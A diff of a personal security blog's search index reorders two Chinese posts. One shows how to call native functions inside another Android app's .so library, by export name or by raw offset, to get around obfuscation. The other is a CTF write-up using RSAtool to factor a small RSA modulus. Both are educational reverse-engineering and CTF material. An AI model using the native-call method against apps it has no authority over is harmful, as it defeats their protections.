@@ -1,6 +1,74 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Android强调native函数的两种方法</title>
+    <url>/2020/04/29/Android%E5%BC%BA%E8%B0%83native%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p>在逆向分析APP的过程中，经常会遇到native函数调用，有些是可以通过正常的IDA动态调试分析其函数逻辑算法等，但有些函数由于多线程造成调试不便，甚至由于ollvm等混淆造成逆向困难就需要自行调用native函数实现想要的结果。<br><a id="more"></a></p>
+<h1 id="通过导出函数调用native函数"><a href="#通过导出函数调用native函数" class="headerlink" title="通过导出函数调用native函数"></a>通过导出函数调用native函数</h1><p>一般普通的native函数都是有导出函数的，因此只要找到导出函数名即可调用该native函数。</p>
+<h2 id="寻找导出函数"><a href="#寻找导出函数" class="headerlink" title="寻找导出函数"></a>寻找导出函数</h2><p>首先在java层找到native函数的调用<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native1.jpg" alt=""></p>
+<p>接下来在so中导出函数中该native函数</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native2.jpg" alt=""></p>
+<h2 id="编写Android-APP"><a href="#编写Android-APP" class="headerlink" title="编写Android APP"></a>编写Android APP</h2><p>自己写一个带按钮的APP，调用该函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">public</span> Button button;</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span></div><div class="line">		&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">	</div><div class="line">			System.loadLibrary(<span class="string">"Aes"</span>);</div><div class="line">	</div><div class="line">			<span class="keyword">try</span> </div><div class="line">			&#123;</div><div class="line">				button = (Button)findViewById(R.id.btn_test);</div><div class="line">				button.setOnClickListener(<span class="keyword">new</span> OnClickListener() </div><div class="line">				&#123;</div><div class="line">			</div><div class="line">					<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span></div><div class="line">					&#123;</div><div class="line">						<span class="keyword">try</span> </div><div class="line">						&#123;</div><div class="line">							String encrypt = Aes.aesEncode(<span class="string">"12345"</span>,</div><div class="line">									<span class="string">"350710466385995"</span>);</div><div class="line">							</div><div class="line">							<span class="keyword">if</span> (<span class="keyword">null</span> != encrypt) </div><div class="line">							&#123;</div><div class="line">		</div><div class="line">								Log.d(<span class="string">"bbk"</span>,<span class="string">"encrypt:"</span> + encrypt);</div><div class="line">							&#125;</div><div class="line">							<span class="keyword">else</span> </div><div class="line">							&#123;</div><div class="line">								Log.d(<span class="string">"bbk"</span>, <span class="string">"encrypt is NULL"</span>);</div><div class="line">							&#125;	</div><div class="line">						</div><div class="line">						&#125; </div><div class="line">						<span class="keyword">catch</span> (Exception e) </div><div class="line">						&#123;</div><div class="line">							<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">							&#123;</div><div class="line">								Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">							&#125;</div><div class="line">						&#125; </div><div class="line">						</div><div class="line">					&#125;</div><div class="line">				&#125;);</div><div class="line">		</div><div class="line">			&#125; </div><div class="line">			<span class="keyword">catch</span> (Exception e) </div><div class="line">			&#123;</div><div class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">				&#123;</div><div class="line">					Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">				&#125;</div><div class="line">			&#125;  </div><div class="line">			</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p>模拟原APP调用类调用native函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Aes</span> </span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">aesEncode</span><span class="params">(String str, String str2)</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="jni配置"><a href="#jni配置" class="headerlink" title="jni配置"></a>jni配置</h2><p>将libAes.so及其依赖库libstlport.shared.so放入jni目录，并编写mk文件配置。</p>
+<h3 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := Aes</div><div class="line">LOCAL_SRC_FILES := libAes.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := stlport_shared</div><div class="line">LOCAL_SRC_FILES := libstlport_shared.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := my_objectname</div><div class="line">LOCAL_SRC_FILES := my_objectname.cpp</div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
+<h3 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div></pre></td></tr></table></figure>
+<h3 id="my-objectname-app"><a href="#my-objectname-app" class="headerlink" title="my_objectname.app"></a>my_objectname.app</h3><p>里面写#include<jni.h>即可</jni.h></p>
+<p>最后将APP安装到手机上运行即可输出调用结果</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native3.jpg" alt=""></p>
+<h1 id="通过函数地址调用native函数"><a href="#通过函数地址调用native函数" class="headerlink" title="通过函数地址调用native函数"></a>通过函数地址调用native函数</h1><p>在逆向过程中还会遇到很多APP动态注册native函数，甚至是将导出函数隐藏的，就无法使用上述的调用方案了，本方案是通过函数地址来调用native函数，理论上只要找得到native函数在so中的地址就可以实现调用。</p>
+<h2 id="寻找native函数地址"><a href="#寻找native函数地址" class="headerlink" title="寻找native函数地址"></a>寻找native函数地址</h2><p>在java层找到native函数，确定其传入参数类型及个数</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native4.jpg" alt=""></p>
+<p>kxtmp函数是动态注册函数，现在字符串中搜索函数名，之后通过回溯找到函数注册地址</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native5.jpg" alt=""></p>
+<h2 id="编写调用so"><a href="#编写调用so" class="headerlink" title="编写调用so"></a>编写调用so</h2><p>本方案主要是通过自己编写的so调用native函数所在的so，自己的so名为hookso<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">			</div><div class="line">			System.loadLibrary(<span class="string">"hookso"</span>);</div><div class="line">			</div><div class="line">			<span class="keyword">float</span> value =TypedValue.complexToFloat(<span class="number">55297</span>);</div><div class="line">			Log.e(<span class="string">"DEBUG"</span>, <span class="string">": "</span> + value);</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</div><div class="line">			<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></div><div class="line">			getMenuInflater().inflate(R.menu.main, menu);</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</div><div class="line">			<span class="comment">// Handle action bar item clicks here. The action bar will</span></div><div class="line">			<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></div><div class="line">			<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></div><div class="line">			<span class="keyword">int</span> id = item.getItemId();</div><div class="line">			<span class="keyword">if</span> (id == R.id.action_settings) &#123;</div><div class="line">				JNI.testfunc();</div><div class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNI</span></span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">testfunc</span><span class="params">()</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="jni配置-1"><a href="#jni配置-1" class="headerlink" title="jni配置"></a>jni配置</h2><h3 id="Android-mk-1"><a href="#Android-mk-1" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"></div><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := hookso</div><div class="line">LOCAL_SRC_FILES := hookso.cpp</div><div class="line"></div><div class="line">LOCAL_LDLIBS += -llog  #<span class="built_in">log</span></div><div class="line"></div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
+<h3 id="Application-mk-1"><a href="#Application-mk-1" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div><div class="line">APP_STL := c++<span class="number">_</span>shared</div><div class="line">APP_CPPFLAGS := -fexceptions -frtti</div></pre></td></tr></table></figure>
+<h3 id="hookso-cpp"><a href="#hookso-cpp" class="headerlink" title="hookso.cpp"></a>hookso.cpp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/un.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">u_int32_t</span> <span class="params">(*<span class="keyword">common_func_t</span>)</span><span class="params">(<span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_TAG <span class="meta-string">"DEBUG"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(lvl, fmt, args...) __android_log_print(lvl, \</span></div><div class="line">		LOG_TAG, fmt, ##args)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_module_base</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name)</span></span></div><div class="line">&#123;</div><div class="line">    FILE* fp;</div><div class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;</div><div class="line">    <span class="keyword">char</span> *pch;</div><div class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];</div><div class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(pid &lt;= <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);</div><div class="line">    &#125;</div><div class="line">    fp = fopen(filename,<span class="string">"r"</span>);</div><div class="line">    <span class="keyword">if</span>(fp != <span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">while</span>(fgets(line, <span class="keyword">sizeof</span>(line), fp))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(<span class="built_in">strstr</span>(line, module_name))</div><div class="line">            &#123;</div><div class="line">                pch = strtok(line, <span class="string">"-"</span>);</div><div class="line">                addr = strtoul(pch, <span class="literal">NULL</span>, <span class="number">16</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        fclose(fp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)addr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">string</span> str = <span class="string">"1"</span>;</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"Java_com_example_hookso_JNI_testfunc: %s\n"</span>, str.c_str());</div><div class="line">	<span class="keyword">void</span> *cs_handle = dlopen(<span class="string">"/data/local/tmp/native.so"</span>, RTLD_NOW);</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] dlerror : %s"</span>, dlerror());</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] cs_handle: %p"</span>, cs_handle);</div><div class="line"><span class="comment">//导出用下面这一句</span></div><div class="line"><span class="comment">//	void *cs_open_func = dlsym(cs_handle, "导出函数name");</span></div><div class="line"></div><div class="line">	<span class="keyword">u_int32_t</span> addr1 = (<span class="keyword">u_int32_t</span>)get_module_base(<span class="number">0</span>, <span class="string">"ntiave.so"</span>);</div><div class="line">	<span class="comment">//arm指令不加1 0，thumb指令加1 1</span></div><div class="line">	addr1 += <span class="number">0x0000ABD4</span>;</div><div class="line">	<span class="keyword">common_func_t</span> func = (<span class="keyword">common_func_t</span>)addr1;</div><div class="line"></div><div class="line">	jstring key = env-&gt;NewStringUTF(<span class="string">"1"</span>);</div><div class="line"><span class="comment">//	jstring str = env-&gt;NewStringUTF("qazwsxedcrfvtgbh64as65d465wq6d54a6s54d98aw4d65a4sd64qw6f46a4s9fd8d");</span></div><div class="line"></div><div class="line">	jstring ret1 = (jstring)func((<span class="keyword">u_int32_t</span>)env, <span class="number">0</span>, (<span class="keyword">u_int32_t</span>)key, <span class="number">0</span>);</div><div class="line"><span class="comment">//	jstring ret1 = (jstring)func((u_int32_t)env, 0, 0, 0);</span></div><div class="line"></div><div class="line">	LOGD(ANDROID_LOG_DEBUG, <span class="string">"[+] test_jstr: %s, size: %d"</span>, env-&gt;GetStringUTFChars((jstring)ret1, <span class="literal">false</span>), env-&gt;GetStringUTFLength((jstring)ret1));</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+        <tag>Tools</tag>
+        <tag>eclipse</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RSAtool使用方法</title>
+    <url>/2016/08/19/RSAtools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p>最近在做CTF的时候遇到几道RSA的解密题目，网上介绍了RSAtool这款工具，在网上找了一部分资料，也没有相关的使用方法，自己总结了一下，写下来和大家一起分享。<br><a id="more"></a><br>RSAtool是一个非常方便实用的小工具，可以用来计算RSA中的几个参数、生成密钥、加解密，一些不太复杂的破解工作也可以用它。</p>
+<p>这里就不在RSA算法上多做研究了，直接通过两个CTF例子直观体现吧。</p>
+<h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><pre><code>还记得veryeasy RSA吗？是不是不难？那继续来看看这题吧，这题也不难。
+已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的公钥：
+(N=322831561921859 e = 23)
+请解密出明文，提交时请将数字转化为ascii码提交
+比如你解出的明文是0x6162，那么请提交字符串ab
+提交格式:PCTF{明文字符串}
+</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools4.png" alt=""></p>
+<p>图中的P、Q、R、D、E分别就是RSA算法中的p、q、N、d、e，右上角选择进制，注意不要弄错，e只有十六进制可用，所以这里要把23换成17。</p>
+<p>将N=322831561921859填入，左下角有一个Factor N的按钮，这是分解N的意思，点一下，会自动开始分解因数，得到P=13574881、Q=23781539，再点一下Calc. D，计算出d=42108459725927，这时可以看到Test按钮不再是灰色，表明可以使用简单的加解密功能，点它，弹出一个框。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools3.png" alt=""></p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools2.png" alt=""></p>
+<p>第一个框是明文，第二个框是密文，输入明文123456，点击Encrypt，得到密文1464305227134，这时就可以使用解密功能（好像必须先用一次加密才行）。</p>
+<p>密文0xdc2eeeb2782c，换算十进制242094131279916，点Decrypt，直接得到字符串3a5Y。</p>
+<h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><pre><code>已知RSA公钥生成参数：
+p = 3487583947589437589237958723892346254777 
+q = 8767867843568934765983476584376578389
+e = 65537
+求d = 
+请提交PCTF{d}
+</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools1.png" alt=""></p>
+<p>直接将p，q填入，将e的值65537转换成10进制10001，之后计算d的值就可以了。</p>
+]]></content>
+      <tags>
+        <tag>密码学</tag>
+        <tag>工具</tag>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>X-MAN(level0~level2)</title>
     <url>/2017/02/24/X-MAN-level0-level2/</url>
     <content><![CDATA[<p>题目资源在<a href="https://www.jarvisoj.com" target="_blank" rel="external">这里</a><br><a id="more"></a><br>这几个题目比较简单，就不一一详细描述了，exp如下：</p>
@@ -64,74 +132,6 @@ p.interactive()
       <tags>
         <tag>ctf</tag>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RSAtool使用方法</title>
-    <url>/2016/08/19/RSAtools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<p>最近在做CTF的时候遇到几道RSA的解密题目，网上介绍了RSAtool这款工具，在网上找了一部分资料，也没有相关的使用方法，自己总结了一下，写下来和大家一起分享。<br><a id="more"></a><br>RSAtool是一个非常方便实用的小工具，可以用来计算RSA中的几个参数、生成密钥、加解密，一些不太复杂的破解工作也可以用它。</p>
-<p>这里就不在RSA算法上多做研究了，直接通过两个CTF例子直观体现吧。</p>
-<h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><pre><code>还记得veryeasy RSA吗？是不是不难？那继续来看看这题吧，这题也不难。
-已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的公钥：
-(N=322831561921859 e = 23)
-请解密出明文，提交时请将数字转化为ascii码提交
-比如你解出的明文是0x6162，那么请提交字符串ab
-提交格式:PCTF{明文字符串}
-</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools4.png" alt=""></p>
-<p>图中的P、Q、R、D、E分别就是RSA算法中的p、q、N、d、e，右上角选择进制，注意不要弄错，e只有十六进制可用，所以这里要把23换成17。</p>
-<p>将N=322831561921859填入，左下角有一个Factor N的按钮，这是分解N的意思，点一下，会自动开始分解因数，得到P=13574881、Q=23781539，再点一下Calc. D，计算出d=42108459725927，这时可以看到Test按钮不再是灰色，表明可以使用简单的加解密功能，点它，弹出一个框。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools3.png" alt=""></p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools2.png" alt=""></p>
-<p>第一个框是明文，第二个框是密文，输入明文123456，点击Encrypt，得到密文1464305227134，这时就可以使用解密功能（好像必须先用一次加密才行）。</p>
-<p>密文0xdc2eeeb2782c，换算十进制242094131279916，点Decrypt，直接得到字符串3a5Y。</p>
-<h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><pre><code>已知RSA公钥生成参数：
-p = 3487583947589437589237958723892346254777 
-q = 8767867843568934765983476584376578389
-e = 65537
-求d = 
-请提交PCTF{d}
-</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools1.png" alt=""></p>
-<p>直接将p，q填入，将e的值65537转换成10进制10001，之后计算d的值就可以了。</p>
-]]></content>
-      <tags>
-        <tag>密码学</tag>
-        <tag>工具</tag>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Android强调native函数的两种方法</title>
-    <url>/2020/04/29/Android%E5%BC%BA%E8%B0%83native%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<p>在逆向分析APP的过程中，经常会遇到native函数调用，有些是可以通过正常的IDA动态调试分析其函数逻辑算法等，但有些函数由于多线程造成调试不便，甚至由于ollvm等混淆造成逆向困难就需要自行调用native函数实现想要的结果。<br><a id="more"></a></p>
-<h1 id="通过导出函数调用native函数"><a href="#通过导出函数调用native函数" class="headerlink" title="通过导出函数调用native函数"></a>通过导出函数调用native函数</h1><p>一般普通的native函数都是有导出函数的，因此只要找到导出函数名即可调用该native函数。</p>
-<h2 id="寻找导出函数"><a href="#寻找导出函数" class="headerlink" title="寻找导出函数"></a>寻找导出函数</h2><p>首先在java层找到native函数的调用<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native1.jpg" alt=""></p>
-<p>接下来在so中导出函数中该native函数</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native2.jpg" alt=""></p>
-<h2 id="编写Android-APP"><a href="#编写Android-APP" class="headerlink" title="编写Android APP"></a>编写Android APP</h2><p>自己写一个带按钮的APP，调用该函数</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">public</span> Button button;</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span></div><div class="line">		&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">	</div><div class="line">			System.loadLibrary(<span class="string">"Aes"</span>);</div><div class="line">	</div><div class="line">			<span class="keyword">try</span> </div><div class="line">			&#123;</div><div class="line">				button = (Button)findViewById(R.id.btn_test);</div><div class="line">				button.setOnClickListener(<span class="keyword">new</span> OnClickListener() </div><div class="line">				&#123;</div><div class="line">			</div><div class="line">					<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span></div><div class="line">					&#123;</div><div class="line">						<span class="keyword">try</span> </div><div class="line">						&#123;</div><div class="line">							String encrypt = Aes.aesEncode(<span class="string">"12345"</span>,</div><div class="line">									<span class="string">"350710466385995"</span>);</div><div class="line">							</div><div class="line">							<span class="keyword">if</span> (<span class="keyword">null</span> != encrypt) </div><div class="line">							&#123;</div><div class="line">		</div><div class="line">								Log.d(<span class="string">"bbk"</span>,<span class="string">"encrypt:"</span> + encrypt);</div><div class="line">							&#125;</div><div class="line">							<span class="keyword">else</span> </div><div class="line">							&#123;</div><div class="line">								Log.d(<span class="string">"bbk"</span>, <span class="string">"encrypt is NULL"</span>);</div><div class="line">							&#125;	</div><div class="line">						</div><div class="line">						&#125; </div><div class="line">						<span class="keyword">catch</span> (Exception e) </div><div class="line">						&#123;</div><div class="line">							<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">							&#123;</div><div class="line">								Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">							&#125;</div><div class="line">						&#125; </div><div class="line">						</div><div class="line">					&#125;</div><div class="line">				&#125;);</div><div class="line">		</div><div class="line">			&#125; </div><div class="line">			<span class="keyword">catch</span> (Exception e) </div><div class="line">			&#123;</div><div class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">				&#123;</div><div class="line">					Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">				&#125;</div><div class="line">			&#125;  </div><div class="line">			</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
-<p>模拟原APP调用类调用native函数</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Aes</span> </span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">aesEncode</span><span class="params">(String str, String str2)</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="jni配置"><a href="#jni配置" class="headerlink" title="jni配置"></a>jni配置</h2><p>将libAes.so及其依赖库libstlport.shared.so放入jni目录，并编写mk文件配置。</p>
